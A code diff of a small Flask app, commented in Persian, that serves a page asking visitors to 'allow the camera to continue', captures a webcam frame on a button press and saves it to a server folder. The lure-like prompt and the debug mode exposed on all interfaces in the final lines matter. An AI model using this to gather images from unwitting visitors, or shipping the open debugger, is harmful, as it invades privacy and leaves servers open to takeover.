@@ -1,62 +1,133 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, render_template_string, request
+import os
 import base64
+from datetime import datetime
 
 app = Flask(__name__)
 
-HTML = '''
+# پوشه ذخیره عکس‌ها
+UPLOAD_FOLDER = "photos"
+
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
+
+# صفحه HTML
+HTML_PAGE = """
 <!DOCTYPE html>
-<html>
+<html lang="fa">
 <head>
-    <title>Camera</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access</title>
+
+    <style>
+        body{
+            font-family:sans-serif;
+            text-align:center;
+            background:#f5f5f5;
+            padding-top:40px;
+        }
+
+        video{
+            width:320px;
+            border-radius:10px;
+            border:3px solid #333;
+        }
+
+        button{
+            margin-top:20px;
+            padding:12px 25px;
+            font-size:18px;
+            border:none;
+            border-radius:10px;
+            background:#007bff;
+            color:white;
+            cursor:pointer;
+        }
+
+        button:hover{
+            background:#0056b3;
+        }
+    </style>
 </head>
 <body>
 
-<h2>برای ادامه اجازه دوربین بدهید</h2>
+    <h2>برای ادامه اجازه دوربین بدهید</h2>
 
-<video id="video" autoplay width="300"></video>
-<br><br>
+    <video id="video" autoplay></video>
 
-<button onclick="takePhoto()">گرفتن عکس</button>
+    <br>
 
-<canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
+    <button onclick="takePhoto()">
+        گرفتن عکس
+    </button>
 
-<script>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(function(stream) {
-    document.getElementById("video").srcObject = stream;
-});
+    <script>
 
-function takePhoto() {
+        // روشن کردن دوربین
+        navigator.mediaDevices.getUserMedia({
+            video: true
+        })
 
-    const canvas = document.getElementById("canvas");
-    const video = document.getElementById("video");
+        .then(stream => {
+            document.getElementById("video").srcObject = stream;
+        })
 
-    canvas.getContext('2d').drawImage(video, 0, 0, 300, 200);
+        .catch(error => {
+            alert("دسترسی دوربین داده نشد");
+            console.log(error);
+        });
 
-    let image = canvas.toDataURL("image/png");
 
-    fetch('/upload', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({image:image})
-    });
+        // گرفتن عکس
+        function takePhoto(){
 
-    alert("عکس ارسال شد");
-}
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
 
-</script>
+            const ctx = canvas.getContext("2d");
+
+            ctx.drawImage(video, 0, 0, 320, 240);
+
+            const imageData = canvas.toDataURL("image/png");
+
+            fetch("/upload", {
+
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+                    image: imageData
+                })
+
+            })
+
+            .then(response => response.text())
+
+            .then(data => {
+                alert("عکس ذخیره شد");
+            });
+
+        }
+
+    </script>
 
 </body>
 </html>
-'''
+"""
 
+# صفحه اصلی
 @app.route('/')
 def home():
-    return render_template_string(HTML)
+    return render_template_string(HTML_PAGE)
 
+
+# آپلود عکس
 @app.route('/upload', methods=['POST'])
 def upload():
 
@@ -64,9 +135,22 @@ def upload():
 
     image_data = data.split(",")[1]
 
-    with open("photo.png", "wb") as f:
+    filename = datetime.now().strftime("%Y%m%d%H%M%S") + ".png"
+
+    filepath = os.path.join(UPLOAD_FOLDER, filename)
+
+    with open(filepath, "wb") as f:
         f.write(base64.b64decode(image_data))
 
-    return {"status":"saved"}
+    print(f"Saved: {filepath}")
 
-app.run(host='0.0.0.0', port=5000)
+    return "OK"
+
+
+# اجرای برنامه
+if __name__ == '__main__':
+    app.run(
+        host='0.0.0.0',
+        port=5000,
+        debug=True
+    )
